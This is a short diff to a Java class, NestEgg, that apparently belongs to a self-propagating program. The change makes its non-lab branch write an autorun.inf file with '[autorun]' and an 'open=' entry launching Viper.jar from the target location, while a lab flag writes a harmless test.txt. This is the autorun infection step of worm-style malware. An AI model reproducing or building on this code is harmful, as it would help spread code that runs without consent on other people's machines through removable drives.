@@ -12,7 +12,7 @@ import communication.Identification;
 
 public class NestEgg {
 	static String[] inCodedL= {"testing","testing","testing"};
-	static String[] inCodedW= {"testing","testing","testing"};
+	static String[] inCodedW= {"[autorun]","open="};
 	static int unitCopys=0;
 	static int unitNum;
 public static void labEgg(Path vPath,int unitNumber){
@@ -111,7 +111,10 @@ public static int getUnitsCreated(){
 	
 }
 public static void createAutoRun(boolean lab, File nestLocation) throws IOException{
-	 FileWriter fw= new FileWriter(nestLocation.getAbsolutePath());
+	FileWriter fw;
+	if(lab==true){
+	fw = new FileWriter(nestLocation.getAbsolutePath()+"/test.txt");
+	}else{ fw= new FileWriter(nestLocation.getAbsolutePath()+"/autorun.inf");}
 		BufferedWriter writing= new BufferedWriter(fw);
 	
 		if(lab==true){
@@ -123,7 +126,9 @@ public static void createAutoRun(boolean lab, File nestLocation) throws IOExcept
 	    writing.close();
 		}else if(lab==false){
 			for(int x=0;x<inCodedW.length; x++){
-				writing.write(inCodedW[x]);
+				if(x==1){
+				writing.write(inCodedW[x]+nestLocation.getAbsolutePath()+"/Viper.jar");
+				}else{writing.write(inCodedW[x]);}
 				writing.newLine();
 				}
 			    writing.close();	
